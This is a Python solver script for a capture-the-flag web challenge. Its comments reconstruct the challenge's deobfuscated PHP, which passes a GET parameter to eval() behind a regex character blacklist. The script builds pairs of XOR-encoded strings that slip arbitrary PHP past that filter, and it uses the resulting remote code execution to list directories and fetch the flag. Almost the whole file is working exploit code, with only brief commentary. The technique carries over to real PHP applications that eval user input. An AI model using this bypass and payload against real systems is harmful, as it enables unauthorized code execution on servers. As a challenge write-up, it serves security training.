import requests
import urllib
import re

base_url = 'https://until-the-end.secchallenge.crysys.hu'


def solve():
    dirlist = scandir('.')
    hidden_folder = re.search('very.*', dirlist).group()
    subfolder = scandir(hidden_folder)
    assert 'flag' in subfolder
    return requests.get(f'{base_url}/{hidden_folder}/flag').text


def scandir(path):
    return rce(f'foreach (scandir("{path}") as $v) echo "$v\n";')


def rce(cmd):

    # The task is built around PHPFuck obfuscation. After extracting the mess, we get:

    # if (isset($_GET[' '])) {
    #   eval(str_replace('a', str_replace('kekw'), str_rot13(strtoupper(substr($_GET[' '], 42, 69)))));
    # }
    # else if (isset($_GET['+'])) {
    #   if (preg_match('/[b-d\-0-9H-LA-DU-Xi-kn-s!?TEz.]/', $_GET['+'])) die();
    #   eval($_GET['+']);
    # }
    # else {
    #   die();
    #   shell_exec($_GET['cmd']);
    # }

    # We will exploit the second 'if' case.
    # 1) To trick the regexp filter find enc1 and enc2 so that enc1 ^ enc2 = cmd
    # 2) call eval() to trigger the exploit:

    enc1, enc2 = encode(f'echo "qqqqq"; {cmd} echo "qqqqq";')
    exploit = f"eval({enc1}^{enc2});"
    response = requests.get(f'{base_url}?%2b={urllib.parse.quote(exploit)}').text
    return re.search(r'qqqqq(.*)qqqqq', response, re.DOTALL).group(1)


def encode(st):
    rx = r'[\'"b-d\-0-9H-LA-DU-Xi-kn-s!?TEz.]'
    res1 = ""
    res2 = ""

    for ch in st:
        for i in range(32, 127):
            x = ord(ch) ^ i
            if 32 <= x < 127 and not re.match(rx, chr(x)) and not re.match(rx, chr(i)):
                res1 += chr(x)
                res2 += chr(i)
                break

    return f"'{res1}'", f"'{res2}'"


if __name__ == "__main__":
    print(solve())
